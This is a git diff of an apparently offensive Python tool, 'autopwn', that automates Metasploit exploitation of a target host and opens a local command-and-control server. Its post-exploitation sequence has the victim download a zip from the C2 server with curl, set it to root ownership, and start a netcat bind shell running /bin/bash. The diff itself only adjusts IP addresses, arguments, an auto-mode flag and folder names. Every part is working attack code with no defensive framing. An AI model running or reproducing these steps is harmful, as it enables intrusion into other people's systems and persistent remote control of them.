@@ -363,7 +363,7 @@ def autopwn(Rhosts="192.168.1.45",
     print("Starting msfrpcd...")
     client = runMetasploit(False)
     modlist = searchModules(client, attack)
-    exploitVuln(client, modlist)
+    exploitVuln(Rhosts,Lhost,auto_mode,client, modlist)
 
     print(client.sessions.list)
     print("\n")
@@ -375,8 +375,8 @@ def autopwn(Rhosts="192.168.1.45",
         LOG("Entered in C&C section", logfile, "inf")
 
         print("[~] Opening local C2 server ...")
-        (proc, port) = postexploit.openCtrlSrv("192.168.1.45")
-        ipport = "http://192.168.1.45:" + str(port)
+        (proc, port) = postexploit.openCtrlSrv("192.168.1.37")
+        ipport = "http://192.168.1.37:" + str(port)
     else:
         ipport = "0.0.0.0:0"  # Do not use ip/port if there is no command and control
     print("[V] Pwn complete !!! ")
@@ -402,7 +402,7 @@ if __name__ == "__main__":
             Lhost = sys.argv[2]
 
     (shell, client, srv) = autopwn(
-        Rhosts="192.168.1.45",Lhost="192.168.1.37",generic_exploit=True, get_edb_exploits=True, com_and_cont=True, auto_mode=False
+        Rhosts="192.168.1.45",Lhost="192.168.1.37",generic_exploit=True, get_edb_exploits=True, com_and_cont=True, auto_mode=True
     )
 
     sequence = [
@@ -420,8 +420,8 @@ if __name__ == "__main__":
     	"ls",
         "curl -s " + srv + "/post/main.zip -o main.zip > /dev/null",
         "unzip main.zip",
-        "chown root:root pwnguin",
-        "cd pwnguin",
+        "chown root:root pwnguin-main",
+        "cd pwnguin-main",
         "chmod -R 700 .",
         "echo pwnguined",
         "nc -l -p 45678 -e /bin/bash",
